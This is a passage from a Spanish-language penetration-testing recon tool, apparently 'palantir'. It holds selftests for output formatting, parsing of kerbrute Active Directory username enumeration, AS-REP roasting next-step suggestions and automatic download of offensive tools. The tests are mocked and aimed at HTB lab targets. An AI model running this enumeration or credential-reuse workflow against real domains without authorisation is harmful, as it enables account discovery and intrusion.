                          [_svc6000], {}, [_fpx], None, 754)
    # Sin ANSI: `palantir --selftest` en una terminal real colorea el resumen (C_* llevan códigos de
    # color cuando stdout es TTY) y «1 puerto» dejaba de ser subcadena contigua ('1\x1b[0m puerto(s)').
    _sumtxt = _ANSI_RE.sub("", _sumbuf.getvalue())
    assert "RESUMEN · 10.10.10.9 (box.htb)" in _sumtxt, _sumtxt
    assert "12m 34s" in _sumtxt and "1 puerto" in _sumtxt, _sumtxt
    assert "1 altas" in _sumtxt and "Empieza por" in _sumtxt, _sumtxt

    # render_footprint: footprints ligados al dominio (ports=[], p. ej. fp_whois/fp_ctlogs/
    # fp_dns_nameservers) no deben dejar un '()' colgando en pantalla — mismo criterio que
    # build_markdown ya aplicaba (ver "## WHOIS ()" arriba), pero el terminal no lo tenía.
    _rf_buf = _io_sum.StringIO()
    with _ctx_sum.redirect_stdout(_rf_buf):
        render_footprint([
            {"proto": "whois", "title": "WHOIS", "ports": [], "steps": [],
             "findings": [], "next": [], "missing": []},
            {"proto": "smb", "title": "SMB", "ports": [445], "steps": [],
             "findings": [], "next": [], "missing": []},
        ])
    _rftxt = _ANSI_RE.sub("", _rf_buf.getvalue())
    assert "▸ WHOIS ()" not in _rftxt and "▸ WHOIS \n" not in _rftxt, _rftxt   # sin '()' colgando
    assert "▸ WHOIS\n" in _rftxt and "▸ SMB (445)" in _rftxt, _rftxt          # con puertos, sí los lleva

    # _parse_kerbrute_users: saca el usuario de 'VALID USERNAME: user@dominio' (sin el
    # dominio), marca los '(no pre-auth)' como AS-REP roastables, tolera ANSI y dedup.
    _kb_out = ("2026/10/27 12:00:00 >  [+] VALID USERNAME:\t administrator@garfield.htb\n"
               "2026/10/27 12:00:01 >  [+] VALID USERNAME:\t jon@garfield.htb\n"
               "\x1b[32m2026/10/27 12:00:02 >  [+] jon has no pre auth required. VALID USERNAME:\t jon@garfield.htb\x1b[0m\n"
               "2026/10/27 12:00:03 >  Done! Tested 17 usernames\n")
    _kbu, _kbna = _parse_kerbrute_users(_kb_out)
    assert _kbu == ["administrator", "jon"], _kbu          # dedup + sin @dominio
    assert _kbna == ["jon"], _kbna                         # el '(no pre auth)' marcado aparte
    assert _parse_kerbrute_users("") == ([], [])
    assert _parse_kerbrute_users("nada que ver aquí") == ([], [])

    # _userenum_wordlist: en automático prefiere jsmith.txt (nombres de empleado realistas,
    # insidetrust/statistically-likely-usernames) a la shortlist genérica de seclists — pero
    # SOLO si el operador la instaló; si no, cae a la shortlist; sin ninguna, None (sugerencia
    # manual). Se parchea Path.is_file (no se toca el disco real) para controlar cuál "existe".
    _real_is_file = Path.is_file
    try:
        Path.is_file = lambda self: str(self) in (_JSMITH_USERLISTS[0], _SMALL_USERLISTS[0])
        assert _userenum_wordlist() == _JSMITH_USERLISTS[0]    # las dos "instaladas": gana jsmith
        Path.is_file = lambda self: str(self) == _SMALL_USERLISTS[0]
        assert _userenum_wordlist() == _SMALL_USERLISTS[0]      # solo la shortlist: cae a ella
        Path.is_file = lambda self: False
        assert _userenum_wordlist() is None                      # ninguna instalada: sugerencia manual
        assert _userenum_wordlist("/tmp/no-existe-de-verdad.txt") is None   # --userenum-wordlist a un fichero inexistente
        Path.is_file = lambda self: True
        assert _userenum_wordlist("/tmp/propia.txt") == "/tmp/propia.txt"   # --userenum-wordlist gana a todo lo automático
    finally:
        Path.is_file = _real_is_file
    # _kerbrute_timeout: el cap depende de CUÁL lista se use, no solo de si hay
    # --userenum-wordlist — jsmith.txt automática (~48 000 líneas) necesita más margen que la
    # shortlist (~17 nombres) aunque las dos sean "automáticas".
    assert _kerbrute_timeout(_SMALL_USERLISTS[0]) == 600
    assert _kerbrute_timeout(_JSMITH_USERLISTS[0]) == 1800
    _real_uwl = globals()["USERENUM_WORDLIST"]
    globals()["USERENUM_WORDLIST"] = "/tmp/xato-10M.txt"
    try:
        assert _kerbrute_timeout(_JSMITH_USERLISTS[0]) == 7200   # operador trajo la suya: gana el cap grande
    finally:
        globals()["USERENUM_WORDLIST"] = _real_uwl

    # fp_kerberos: con dominio + kerbrute + wordlist, ejecuta el userenum DE VERDAD, saca los
    # usuarios como hallazgo y los vuelca a <base>/ad_users.txt (fake de kerbrute/run_capture,
    # sin red). _userenum_wordlist se parchea para no depender de que seclists esté instalado.
    _kb_dir = Path(tempfile.mkdtemp())
    _real_kbbin = globals()["_kerbrute_bin"]; _real_wl = globals()["_userenum_wordlist"]
    _real_bwsf3 = globals()["_bin_with_sudo_fallback"]
    _kb_cmds = []

    def _fake_kb_rc(cmd, timeout=None, quiet=False, **kw):
        _kb_cmds.append(cmd)
        return 0, _kb_out
    globals()["_kerbrute_bin"] = lambda: "FAKE_KERBRUTE"
    globals()["_userenum_wordlist"] = lambda arg=None: "/tmp/fake-users.txt"
    globals()["run_capture"] = _fake_kb_rc
    # impacket-scripts "instalado" (mockeado): el next-step de AS-REP roast con usuarios YA
    # encontrados (_kerbrute_userenum) debe usar el nombre RESUELTO, no "GetNPUsers.py" fijo —
    # mismo bug real confirmado por un operador en Kali que _impacket_suggest_bin de más arriba.
    globals()["_bin_with_sudo_fallback"] = lambda names, **kw: f"impacket-{names[0]}" if not names[0].startswith("impacket-") else names[0]
    try:
        _kbres = fp_kerberos("10.0.0.1", [{"port": 88, "name": "kerberos-sec", "scripts": {}}],
                             [{"port": 88, "name": "kerberos-sec", "scripts": {}}], {}, False,
                             domain="garfield.htb", base=_kb_dir)
    finally:
        globals()["_kerbrute_bin"], globals()["_userenum_wordlist"], globals()["run_capture"] = (
            _real_kbbin, _real_wl, _real_run_capture)
        globals()["_bin_with_sudo_fallback"] = _real_bwsf3
    assert any("userenum" in " ".join(c) for c in _kb_cmds), _kb_cmds
    _kbf = {(s, t) for s, t in _kbres["findings"]}
    assert any(s == "alta" and "2 usuario" in t for s, t in _kbf), _kbf
    assert any(s == "alta" and "SIN pre-auth" in t for s, t in _kbf), _kbf
    assert (_kb_dir / "ad_users.txt").read_text().split() == ["administrator", "jon"]

    # Regresión: ad_users.txt se MEZCLA, no se pisa — bug real reportado por un operador
    # ("me da 256 usuarios válidos si solo han sido 56 [por kerbrute]"): kerbrute escribe su
    # lista (56), luego una credencial válida dispara --users/--rid-brute (Fase 5d) que
    # encuentra el dominio COMPLETO y el write_text de ENTONCES borraba la de kerbrute
    # entera. _merge_write_ad_users debe conservar "administrator"/"jon" (ya en el fichero,
    # escritos arriba por fp_kerberos) Y añadir los nuevos, deduplicado case-insensitive
    # (AD: 'Jon' y 'jon' son la MISMA cuenta — no debe duplicar).
    _merge_write_ad_users(_kb_dir, ["Jon", "svc_sql", "backup_user"])
    assert sorted((_kb_dir / "ad_users.txt").read_text().split()) == sorted(
        ["administrator", "jon", "svc_sql", "backup_user"])
    assert any("impacket-GetNPUsers " in n for n in _kbres["next"]), _kbres["next"]
    assert not any("GetNPUsers.py" in n for n in _kbres["next"]), _kbres["next"]
    # sin dominio resuelto: NO ejecuta kerbrute, deja la sugerencia con placeholder DOMINIO
    _kb_cmds.clear()
    _kbres2 = fp_kerberos("10.0.0.1", [{"port": 88, "name": "kerberos-sec", "scripts": {}}],
                          [{"port": 88, "name": "kerberos-sec", "scripts": {}}], {}, False)
    assert _kb_cmds == [] and any("DOMINIO" in n for n in _kbres2["next"])

    # Cajas: ninguna fila debe descuadrar (ancho visible constante), ni siquiera
    # con una línea larguísima (se trunca) o en cada estilo.
    import io as _io, contextlib as _cl
    for _st in ("simple", "double", "grad"):
        _buf = _io.StringIO()
        with _cl.redirect_stdout(_buf):
            box(["corto", "x" * 300], title="RESUMEN · 10.129.0.0", style=_st)
        _ws = {_vis_len(_r) for _r in _buf.getvalue().splitlines()}
        assert len(_ws) == 1, f"box {_st} descuadra: {_ws}"
    # _char_width / _vis_len: un emoji inequívocamente ancho (📄, 'W' en unicodedata) cuenta 2,
    # no 1 — antes len() a secas lo contaba 1 y la fila salía 1 columna más larga de lo
    # calculado ("borde movido" del RESUMEN). Uno de ancho 'ambiguo' (⏱, 'N' pero con
    # Emoji_Presentation=Sí) cuenta 1 — a 2 lo adivinaba bien en una terminal/fuente y mal en
    # otra (un informe real mostró el "borde movido" en sentido CONTRARIO al que el hack
    # original arreglaba), así que ya no se intenta adivinar.
    assert _char_width("a") == 1 and _char_width("📄") == 2 and _char_width("⏱") == 1
    assert _char_width("️") == 0, "el selector de variación no debe sumar columna"
    assert _vis_len("📄x") == 3 and _vis_len("⏱x") == 2
    # La misma caja ('grad', como el RESUMEN) con un emoji ancho en el cuerpo no debe descuadrar
    # ninguna fila frente a las que no lo llevan.
    _bufe = _io.StringIO()
    with _cl.redirect_stdout(_bufe):
        box([f"{C_GREY}Duración:{C_RESET} 1m 2s   ·   1 puerto(s)",
             "Hallazgos: ninguno",
             f"{C_GREY}📄 Informe:{C_RESET} {C_BLUE}/tmp/report.html{C_RESET}"],
            title="RESUMEN · 10.10.10.9", style="grad")
    _ew = {_vis_len(_r) for _r in _bufe.getvalue().splitlines()}
    assert len(_ew) == 1, f"caja 'grad' con emoji ancho descuadra: {_ew}"
    # _box_inner(): la caja NUNCA debe ser más ancha que la terminal REAL — ni siquiera por
    # debajo del antiguo suelo de 40 columnas (un panel de tmux partido, una app SSH de móvil…).
    # Si lo es, la propia terminal envuelve la fila sola y el marco se descuadra, con el mismo
    # síntoma que el bug de los emoji anchos pero por una causa distinta: antes _box_inner()
    # forzaba un suelo de 40 columnas que ganaba incluso a una terminal real más estrecha.
    _real_gts = shutil.get_terminal_size
    try:
        shutil.get_terminal_size = lambda fallback=(100, 24): os.terminal_size((24, 24))
        _bufn = _io.StringIO()
        with _cl.redirect_stdout(_bufn):
            box(["hola"], title="X", style="simple")
        _nrows = _bufn.getvalue().splitlines()
        assert all(_vis_len(_r) <= 24 for _r in _nrows), \
            f"box más ancha que la terminal real (24 cols): {[_vis_len(_r) for _r in _nrows]}"
        assert len({_vis_len(_r) for _r in _nrows}) == 1, "box descuadra en terminal estrecha"
    finally:
        shutil.get_terminal_size = _real_gts
    # wrap=True (quick wins): una línea larguísima se PARTE en varias (no se trunca),
    # el marco sigue cuadrando (ancho constante) y no aparece el … del truncado.
    _bufw = _io.StringIO()
    with _cl.redirect_stdout(_bufw):
        box(["corto", "x" * 300], title="★ QUICK WINS", style="double", wrap=True)
    _rowsw = _bufw.getvalue().splitlines()
    assert len({_vis_len(_r) for _r in _rowsw}) == 1, "box wrap descuadra"
    assert "…" not in _bufw.getvalue(), "wrap no debe truncar con …"
    assert len(_rowsw) > 4, "la línea de 300 debería partirse en varias filas"
    # El contenido entero sobrevive: las 300 'x' repartidas entre las filas suman 300.
    assert sum(_r.count("x") for _r in _rowsw) == 300, "wrap perdió contenido"
    # _vis_wrap: un carácter ANCHO justo en el punto de corte, sin espacio cerca (corte en
    # seco), no debe dejar la fila en n+1 columnas — antes el desborde se detectaba DESPUÉS de
    # añadir el carácter que se salía, así que esa fila ya lo llevaba dentro.
    _wrows = _vis_wrap("📄" * 10, 9)
    assert all(_vis_len(_r) <= 9 for _r in _wrows), f"_vis_wrap se pasa del presupuesto: {[_vis_len(_r) for _r in _wrows]}"
    assert sum(_r.count("📄") for _r in _wrows) == 10, "_vis_wrap perdió emoji al cortar en seco"
    # Ancho CONSTANTE entre cajas distintas (el fix del "movido"): dos cajas con contenidos de
    # longitud MUY distinta deben salir al MISMO ancho (antes cada una tomaba el de su contenido).
    _wa, _wb = _io.StringIO(), _io.StringIO()
    with _cl.redirect_stdout(_wa):
        box(["x"], title="corta")
    with _cl.redirect_stdout(_wb):
        box(["contenido bastante más largo que el otro, para que se note"], title="otra")
    assert {_vis_len(r) for r in _wa.getvalue().splitlines()} == {_vis_len(r) for r in _wb.getvalue().splitlines()}, "cajas con distinto ancho → se vería 'movido'"
    # phase(): cabecera de fase en caja, cuadra incluso con un título larguísimo (se trunca).
    _wp = _io.StringIO()
    with _cl.redirect_stdout(_wp):
        phase("Fase 9 — " + "z" * 300, "por qué de la fase")
    _pw = {_vis_len(r) for r in _wp.getvalue().splitlines()}
    assert len(_pw) == 1, f"phase descuadra con título largo: {_pw}"
    # phase(): el 'por qué' largo se PARTE en varias líneas en vez de truncarse con … (antes
    # box() sin wrap=True cortaba la explicación a media palabra en casi todas las fases).
    _wp2 = _io.StringIO()
    with _cl.redirect_stdout(_wp2):
        phase("Fase 5d — credenciales aportadas (reutilización entre servicios)",
              "una credencial válida en un servicio suele valer en otros: se prueba cada par "
              "aportado contra SSH/WMI/SMB/RDP/WinRM, con cuidado de no disparar un bloqueo.")
    _phtxt = _wp2.getvalue()
    _phrows = _phtxt.splitlines()
    assert "…" not in _phtxt, f"phase() no debe truncar el 'por qué' con …: {_phtxt}"
    assert len(_phrows) - 2 > 1, f"el 'por qué' largo debería partirse en varias filas: {_phrows}"
    assert len({_vis_len(r) for r in _phrows}) == 1, "phase() wrap descuadra"

    # Banner: orbe (palantír) + wordmark 3D 'palantir' (ANSI Shadow). Se construye en import
    # (si petara, ni llegaríamos aquí); aquí se comprueba que trae ambas partes y que el color
    # del wordmark es degradado con truecolor y cae a cian plano sin él.
    _bare = _ANSI_RE.sub("", BANNER)
    assert "=" in _bare and "█" in _bare, "el banner debe traer el orbe y el wordmark 3D"
    _rt = _TRUECOLOR
    try:
        globals()["_TRUECOLOR"] = True
        assert _wm_color("█", 0, 6) != _wm_color("█", 5, 6), "la cara █ debe ir en degradado (fila 0 ≠ fila 5)"
        assert _wm_color("═", 0, 6) and _wm_color(" ", 0, 6) == ""   # arista coloreada; espacio no
        globals()["_TRUECOLOR"] = False
        assert _wm_color("█", 0, 6) == _WORDMARK_COLOR   # sin truecolor: cian plano (fallback)
    finally:
        globals()["_TRUECOLOR"] = _rt
    # _detect_truecolor: un TERM *-256color (Kali por defecto) cuenta como truecolor aunque no
    # haya COLORTERM (el bug que dejaba el wordmark en cian plano); la consola Linux pura no.
    _renv = dict(os.environ)
    _rcr = C_RESET
    try:
        globals()["C_RESET"] = "\033[0m"   # como si hubiera color (tty)
        os.environ.pop("COLORTERM", None); os.environ["TERM"] = "xterm-256color"
        assert _detect_truecolor() is True, "xterm-256color sin COLORTERM debe dar truecolor"
        os.environ["TERM"] = "linux"
        assert _detect_truecolor() is False, "la consola Linux pura NO es truecolor"
        os.environ["COLORTERM"] = "truecolor"
        assert _detect_truecolor() is True
    finally:
        os.environ.clear(); os.environ.update(_renv); globals()["C_RESET"] = _rcr

    # ── Descarga automática de recursos sin apt (jsmith.txt, kerbrute, certipy…) ──
    # _download_file: éxito (escribe el contenido, crea el directorio padre) y fallo (red
    # caída / lo que sea) sin lanzar nunca — se mockea urllib.request.urlopen, no la red real.
    import urllib.request as _ur, io as _urio, tempfile as _tf
    _real_urlopen = _ur.urlopen

    class _FakeResp(_urio.BytesIO):
        def __enter__(self): return self
        def __exit__(self, *a): self.close()
    _ur.urlopen = lambda req, timeout=None: _FakeResp(b"contenido de prueba")
    try:
        with _tf.TemporaryDirectory() as _td:
            _dest = Path(_td) / "sub" / "fichero.txt"   # subcarpeta que NO existe aún
            _ok, _errmsg = _download_file("https://example.invalid/x", _dest)
            assert _ok and _errmsg is None
            assert _dest.read_bytes() == b"contenido de prueba"
    finally:
        _ur.urlopen = _real_urlopen
    def _boom(req, timeout=None): raise OSError("red caída")
    _ur.urlopen = _boom
    try:
        _ok2, _errmsg2 = _download_file("https://example.invalid/x", "/tmp/no-deberia-escribirse-nunca.txt")
        assert _ok2 is False and "red caída" in _errmsg2
    finally:
        _ur.urlopen = _real_urlopen
    assert not Path("/tmp/no-deberia-escribirse-nunca.txt").exists()   # el fallo no deja basura a medias

    # _github_release_asset: resuelve la URL del asset que CASA con el regex (jsmith.txt no lo
    # necesita —asset sin versión—, pero crt.sh SÍ: el nombre lleva la versión, hay que mirar la
    # API). None si ningún asset casa, o si la API falla/no responde JSON válido.
    _fake_release = json.dumps({"assets": [
        {"name": "crt.sh_3.0.1_linux_amd64.tar.gz", "browser_download_url": "https://x/linux_amd64.tar.gz"},
        {"name": "crt.sh_3.0.1_windows_amd64.zip", "browser_download_url": "https://x/windows.zip"},
    ]}).encode()
    _ur.urlopen = lambda req, timeout=None: _FakeResp(_fake_release)
    try:
        assert _github_release_asset("az7rb/crt.sh", r"linux_amd64\.tar\.gz$") == "https://x/linux_amd64.tar.gz"
        assert _github_release_asset("az7rb/crt.sh", r"freebsd") is None   # ningún asset casa
    finally:
        _ur.urlopen = _real_urlopen
    _ur.urlopen = _boom
    try:
        assert _github_release_asset("az7rb/crt.sh", r".*") is None   # la API falla: None, no lanza
    finally:
        _ur.urlopen = _real_urlopen

    # _install_crtsh: BUG real corregido aquí — el shutil.copy final NO creaba el directorio
    # destino (.local/bin), así que fallaba con 'No such file or directory' si ese directorio
    # todavía no existía (caso normal: operador que nunca usó pipx/pip --user) aunque la
    # descarga/extracción hubieran ido perfectamente. Se construye un .tar.gz REAL en memoria
    # (tarfile, stdlib) con un miembro 'crt.sh' dentro de una subcarpeta con versión — igual
    # que trae la release real (confirmado en el README del repo) — para probar también que
    # se extrae y renombra bien. Nunca toca la red ni GitHub de verdad.
    import tarfile as _tarmod
    _tar_buf = _urio.BytesIO()
    with _tarmod.open(fileobj=_tar_buf, mode="w:gz") as _tar_out:
        _member_data = b"#!/bin/sh\necho fake crt.sh\n"
        _ti = _tarmod.TarInfo(name="crt.sh_3.0.1_linux_amd64/crt.sh")   # subcarpeta, como la release real
        _ti.size = len(_member_data)
        _tar_out.addfile(_ti, _urio.BytesIO(_member_data))
    _tar_bytes = _tar_buf.getvalue()
    _real_ghra, _real_idb = globals()["_github_release_asset"], globals()["_install_dest_bin"]
    with _tf.TemporaryDirectory() as _cd:
        _cdest = Path(_cd) / "una-carpeta-que-no-existe-todavia" / "crt.sh"
        assert not _cdest.parent.exists()   # el escenario exacto del bug
        globals()["_github_release_asset"] = lambda repo, name_re, timeout=20: "https://x/crt.sh.tar.gz"
        globals()["_install_dest_bin"] = lambda name: (_cdest, None)
        _ur.urlopen = lambda req, timeout=None: _FakeResp(_tar_bytes)
        try:
            ok_crt, err_crt = _install_crtsh()
            assert ok_crt and err_crt is None, err_crt
            assert _cdest.is_file() and os.access(_cdest, os.X_OK)   # existe Y es ejecutable
            assert _cdest.read_bytes() == _member_data               # contenido correcto, sin corromper
        finally:
            globals()["_github_release_asset"], globals()["_install_dest_bin"] = _real_ghra, _real_idb
            _ur.urlopen = _real_urlopen

    # _install_pip_pkg: pipx si está (aísla el entorno); si no, pip3 --user como fallback.
    _real_have_pip, _real_rc_pip = globals()["have"], run_capture
    _pip_cmds = []
    globals()["run_capture"] = lambda cmd, timeout=None, **kw: (_pip_cmds.append(cmd), (0, "ok"))[1]
    globals()["have"] = lambda name: name == "pipx"
    try:
        ok3, _ = _install_pip_pkg("certipy-ad")
        assert ok3 and _pip_cmds[-1] == ["pipx", "install", "certipy-ad"]
        globals()["have"] = lambda name: False   # sin pipx: cae a pip --user
        ok4, _ = _install_pip_pkg("certipy-ad")
        assert ok4 and _pip_cmds[-1] == [sys.executable, "-m", "pip", "install", "--user", "certipy-ad"]
    finally:
        globals()["have"], globals()["run_capture"] = _real_have_pip, _real_rc_pip

    # _install_jsmith: BUG real corregido aquí — su destino (_JSMITH_USERLISTS[0]) es un
    # path de SISTEMA bajo /usr/share (igual que seclists), a diferencia de kerbrute/
    # certipy/creds/adidnsdump/crt.sh (todos al $HOME del operador, nunca necesitan
    # privilegio): escribir ahí sin sudo daba 'Permission denied' a secas si quien lanza
    # palantir no es root. Ahora: directo si somos root, 'sudo install' si no (mismo
    # patrón que el apt-get install de preflight()). Se mockea urlopen/is_root/run_capture
    # — nunca toca /usr/share real ni invoca sudo de verdad.
    _real_jsmith_urls, _real_isroot, _real_rc_js = tuple(_JSMITH_USERLISTS), is_root, run_capture
    with _tf.TemporaryDirectory() as _jd:
        _jdest = Path(_jd) / "usr-share-sim" / "jsmith.txt"   # simula /usr/share SIN tocarlo
        globals()["_JSMITH_USERLISTS"] = (str(_jdest),) + _real_jsmith_urls[1:]
        _ur.urlopen = lambda req, timeout=None: _FakeResp(b"jsmith\nssmith\n")
        try:
            # rama root: copia DIRECTA, sin pasar por sudo/run_capture en absoluto.
            def _no_rc_expected(*a, **kw):
                raise AssertionError("rama root: NO debería llamar a run_capture/sudo")
            globals()["is_root"] = lambda: True
            globals()["run_capture"] = _no_rc_expected
            ok5, err5 = _install_jsmith()
            assert ok5 and err5 is None
            assert _jdest.read_bytes() == b"jsmith\nssmith\n"
            _jdest.unlink()

            # rama NO root: 'sudo install -D -m 644 <tmp> <dest>' — comando exacto, y el
            # resultado depende tal cual del returncode de sudo (nunca escribe el propio
            # _install_jsmith, lo hace 'install').
            globals()["is_root"] = lambda: False
            _sudo_cmds = []

            def _fake_sudo_rc(cmd, timeout=None, **kw):
                _sudo_cmds.append(cmd)
                return 0, ""
            globals()["run_capture"] = _fake_sudo_rc
            ok6, err6 = _install_jsmith()
            assert ok6 and err6 is None
            assert len(_sudo_cmds) == 1
            _cmd = _sudo_cmds[0]
            assert _cmd[:4] == ["sudo", "install", "-D", "-m"] and _cmd[4] == "644"
            assert _cmd[-1] == str(_jdest)   # el destino es el de verdad, no el temporal

            # rama NO root, 'sudo install' falla: se propaga el fallo, con el motivo.
            globals()["run_capture"] = lambda cmd, timeout=None, **kw: (1, "sudo: a password is required")
            ok7, err7 = _install_jsmith()
            assert ok7 is False and "password is required" in err7
        finally:
            globals()["_JSMITH_USERLISTS"] = _real_jsmith_urls
            globals()["is_root"] = _real_isroot
            globals()["run_capture"] = _real_rc_js
            _ur.urlopen = _real_urlopen

    # preflight(): con TOOL_PKGS/_FETCHABLE_RESOURCES de prueba (no se toca la red ni los
    # reales) — separa correctamente apt / descargable / puramente manual, y con
    # --install-missing SOLO descarga tras haber avisado (ya verificado arriba en la propia
    # construcción de 'missing': _tool_present se llama ANTES de ofrecer nada).
    _fake_args = argparse.Namespace(no_creds=True, default_creds=False, no_fuzz=True,
                                    no_searchsploit=True, no_footprint=False, nikto=False,
                                    cms_scan=False, crawl=False, nuclei=False,
                                    no_preflight=False, install_missing=True)
    _real_toolpkgs, _real_fetchable = globals()["TOOL_PKGS"], globals()["_FETCHABLE_RESOURCES"]
    _real_tool_present = globals()["_tool_present"]
    _pf_installed = {"fake-fetch-ok": False}

    def _fake_fetch_ok():
        _pf_installed["fake-fetch-ok"] = True
        return True, None

    def _fake_fetch_fail():
        return False, "motivo del fallo"

    def _fake_fetch_raises():
        raise RuntimeError("el fetcher petó")
    globals()["TOOL_PKGS"] = {
        "fake-fetch-ok":   (None, "recurso de prueba que SÍ se instala", ()),
        "fake-fetch-fail": (None, "recurso de prueba cuyo fetch falla (ok=False)", ()),
        "fake-fetch-boom": (None, "recurso de prueba cuyo fetch LANZA una excepción", ()),
        "fake-manual":     (None, "recurso de prueba sin fetcher (puramente manual)", ()),
    }
    globals()["_FETCHABLE_RESOURCES"] = {
        "fake-fetch-ok":   {"fetch": _fake_fetch_ok, "source": "fuente-ok"},
        "fake-fetch-fail": {"fetch": _fake_fetch_fail, "source": "fuente-fail"},
        "fake-fetch-boom": {"fetch": _fake_fetch_raises, "source": "fuente-boom"},
    }
    globals()["_tool_present"] = lambda t: _pf_installed.get(t, False)
    try:
        _pf_out = _io.StringIO()
        with _cl.redirect_stdout(_pf_out):
            _pf_ok = preflight(_fake_args, check_all=True, check_only=True)
        _pf_txt = _pf_out.getvalue()
        assert _pf_ok is True
        assert "fake-fetch-ok" in _pf_txt and "fuente-ok" in _pf_txt   # fuente SIEMPRE visible antes de tocar nada
        assert "Descargables automáticamente" in _pf_txt and "fake-manual" not in _pf_txt.split("Descargables")[1].split("\n")[0]
        assert "Requieren instalación manual" in _pf_txt and "fake-manual" in _pf_txt

        # --install-missing de verdad: descarga lo que tiene fetcher, deja el resto tal cual.
        _pf_out2 = _io.StringIO()
        with _cl.redirect_stdout(_pf_out2):
            preflight(_fake_args, check_all=True)
        _pf_txt2 = _pf_out2.getvalue()
        assert _pf_installed["fake-fetch-ok"] is True            # el fetcher que SÍ funciona, se llamó
        assert "fake-fetch-ok instalado correctamente" in _pf_txt2
        assert "No se pudo instalar fake-fetch-fail" in _pf_txt2 and "motivo del fallo" in _pf_txt2
        assert "No se pudo instalar fake-fetch-boom" in _pf_txt2 and "el fetcher petó" in _pf_txt2   # excepción atrapada, no tumba el resto
        assert "fake-manual" in _pf_txt2   # el puramente manual se sigue listando, nunca se intenta
    finally:
        globals()["TOOL_PKGS"], globals()["_FETCHABLE_RESOURCES"] = _real_toolpkgs, _real_fetchable
        globals()["_tool_present"] = _real_tool_present

    # _crtsh_bin / _kerbrute_bin deben encontrar un binario que _install_dest_bin dejó en
    # .local/bin — BUG REAL encontrado al revisar esto a fondo (pedido explícito del
    # usuario): _crtsh_bin() solo miraba en go/bin/opt-go-bin, así que una instalación
    # automática de crt.sh recién hecha (que SÍ deja el binario en .local/bin, ver
    # _install_dest_bin/_install_crtsh) no se detectaba a sí misma — _tool_present("crt.sh")
    # seguía dando False y preflight() avisaba "no se pudo instalar" aunque la descarga
    # SÍ había funcionado. kerbrute ya estaba bien (su _kerbrute_bin ya miraba en
    # .local/bin); el fix añadió ese mismo directorio a _crtsh_bin. Se simula un $HOME con
    # SUDO_UID (mismo camino que toma _bin_with_sudo_fallback bajo sudo) en vez de tocar el
    # HOME real.
    _real_rh, _real_have_fb = globals()["_real_home"], globals()["have"]
    _real_sudo_uid = os.environ.get("SUDO_UID")
    with tempfile.TemporaryDirectory() as _bd:
        _bindir = Path(_bd) / ".local" / "bin"
        _bindir.mkdir(parents=True)
        for _name in ("crt.sh", "kerbrute"):
            _f = _bindir / _name
            _f.write_text("#!/bin/sh\n")
            _f.chmod(0o755)
        os.environ["SUDO_UID"] = "1000"
        globals()["_real_home"] = lambda ids: Path(_bd)
        globals()["have"] = lambda name: False   # nada en el PATH "real": fuerza a mirar home_dirs
        try:
            assert _crtsh_bin() == str(_bindir / "crt.sh")
            assert _kerbrute_bin() == str(_bindir / "kerbrute")
        finally:
            globals()["_real_home"], globals()["have"] = _real_rh, _real_have_fb
            if _real_sudo_uid is None:
                os.environ.pop("SUDO_UID", None)
            else:
                os.environ["SUDO_UID"] = _real_sudo_uid

    print("selftest OK")


# ───────────────────────── Chequeo de herramientas (pre-flight) ─────────────────────────
# Recursos SIN paquete apt pero con un comando de instalación conocido y SEGURO de
# automatizar (nunca toca el objetivo, nunca pide contraseñas, nunca necesita más
# privilegio del que ya tiene el propio run de palantir) — pedido explícito: "implementa
# descarga automática de jsmith.txt y de otros repos que use palantir, siempre con aviso
# de lo que se va a descargar y por qué, primero que verifique si ya está instalado".
# Separado de TOOL_PKGS (que es solo "apt install X"): preflight() los enseña SIEMPRE
# junto a su fuente exacta (URL o paquete) ANTES de preguntar, y solo los toca si el
# operador confirma (o pasó --install-missing) — primero verificar (`_tool_present`),
# LUEGO actuar, nunca al revés. Las que NO están aquí (p. ej. joomscan: cadena de
# dependencias Perl/cpan demasiado distinta entre distros para automatizar con
# confianza) se quedan en instalación puramente manual, igual que antes.
def _download_file(url, dest, timeout=60):
    """Descarga `url` a `dest` (crea el directorio padre si hace falta) con urllib —
    stdlib puro, sin dependencias nuevas, mismo patrón que el resto del fichero (ver
    `_http_get`/`_crtsh_bin`). Devuelve (True, None) o (False, 'motivo'): NUNCA lanza,
    quien llama decide cómo avisar del fallo (un recurso que falla no debe tumbar el
    resto de preflight)."""
    import urllib.request
    try:
        Path(dest).parent.mkdir(parents=True, exist_ok=True)
        req = urllib.request.Request(url, headers={"User-Agent": "palantir"})
        with urllib.request.urlopen(req, timeout=timeout) as r, open(dest, "wb") as f:
            shutil.copyfileobj(r, f)
        return True, None
    except Exception as e:
        return False, str(e)


def _github_release_asset(repo, name_re, timeout=20):
    """URL de descarga del asset de la ÚLTIMA release de un repo de GitHub cuyo nombre
    case con el regex `name_re` — para binarios publicados con el número de versión EN
    el propio nombre del fichero (p. ej. 'crt.sh_3.0.1_linux_amd64.tar.gz': no se puede
    adivinar la URL sin consultar la API, a diferencia de kerbrute, que SÍ nombra sus
    assets sin versión — confirmado contra las releases reales de los dos repos).
    None en cualquier fallo (red, repo sin releases, ningún asset que case) — NUNCA
    lanza. Es una consulta de SOLO LECTURA a la API pública de GitHub (no escribe nada,
    no necesita token)."""
    import urllib.request, json
    try:
        req = urllib.request.Request(
            f"https://api.github.com/repos/{repo}/releases/latest",
            headers={"User-Agent": "palantir", "Accept": "application/vnd.github+json"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = json.load(r)
        for asset in data.get("assets", []):
            if re.search(name_re, asset.get("name", "")):
                return asset.get("browser_download_url")
    except Exception:
        pass
    return None


def _install_dest_bin(name):
    """Dónde instalar un binario descargado a mano: $HOME/.local/bin del usuario REAL
    bajo sudo (o del usuario actual sin sudo) — el MISMO directorio donde
    `_bin_with_sudo_fallback` ya busca nxc/kerbrute/certipy/etc. instalados por pipx/Go,
    así que en cuanto se descarga aquí, el resto de palantir ya lo encuentra solo, sin
    tocar el PATH. Devuelve (ruta, ids) — `ids` para chown-earlo al usuario real después."""
    ids = _real_user_ids()
    home = (_real_home(ids) if ids else Path.home()) or Path.home()
    d = home / ".local" / "bin"
    return d / name, ids


def _install_jsmith():
    """jsmith.txt (insidetrust/statistically-likely-usernames) — un solo fichero de
    texto, sin build ni dependencias. BUG real corregido aquí: el destino
    (_JSMITH_USERLISTS[0]) es un path de SISTEMA bajo /usr/share, igual que seclists —
    a diferencia de kerbrute/certipy/creds/adidnsdump/crt.sh (todos van al $HOME del
    operador, nunca necesitan privilegio), escribir ahí SIN sudo da 'Permission denied'
    a secas si quien lanza palantir no es root. Se descarga primero a un temporal (eso
